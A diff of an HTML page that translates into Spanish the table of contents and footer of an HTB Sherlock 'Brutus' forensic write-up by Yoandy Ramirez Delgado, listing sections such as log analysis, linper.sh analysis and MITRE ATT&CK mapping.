-        <h4>Table of Contents</h4>
+        <h4>Índice de Contenido</h4>
         <ul class="toc-list">
-          <li><a href="#overview">1 — Challenge Overview</a></li>
-          <li><a href="#timeline">2 — Attack Timeline</a></li>
-          <li><a href="#analysis">3 — Forensic Log Analysis</a></li>
-          <li><a href="#linper">4 — linper.sh Analysis</a></li>
-          <li><a href="#tasks">5 — Task Walkthrough</a></li>
-          <li><a href="#mitre">6 — MITRE ATT&CK Mapping</a></li>
-          <li><a href="#recommendations">7 — Detection &amp; Hardening</a></li>
+          <li><a href="#descripcion">1 — Descripción del Reto</a></li>
+          <li><a href="#timeline">2 — Línea de Tiempo</a></li>
+          <li><a href="#analisis">3 — Análisis Forense de Logs</a></li>
+          <li><a href="#linper">4 — Análisis de linper.sh</a></li>
+          <li><a href="#tareas">5 — Resolución de Tareas</a></li>
+          <li><a href="#mitre">6 — Mapeo MITRE ATT&CK</a></li>
+          <li><a href="#hardening">7 — Detección y Hardening</a></li>
         </ul>
       </div>
 
@@ -937,18 +765,18 @@
 
 <footer>
   <div class="footer-name">Yoandy Ramirez Delgado</div>
-  <div>Cybersecurity Analyst &amp; Penetration Tester
+  <div>Analista de Ciberseguridad &amp; Pentester
     <span class="footer-divider">·</span>
     HTB Sherlock — Brutus
     <span class="footer-divider">·</span>
     DFIR
     <span class="footer-divider">·</span>
-    Very Easy
+    Muy Fácil
     <span class="footer-divider">·</span>
     Staff Pick
   </div>
   <div style="margin-top:6px;font-size:12px;color:var(--text-muted);">
-    Writeup compliant with HackTheBox disclosure policy.
+    Writeup bajo cumplimiento de la política de divulgación de HackTheBox.
   </div>
 </footer>
 
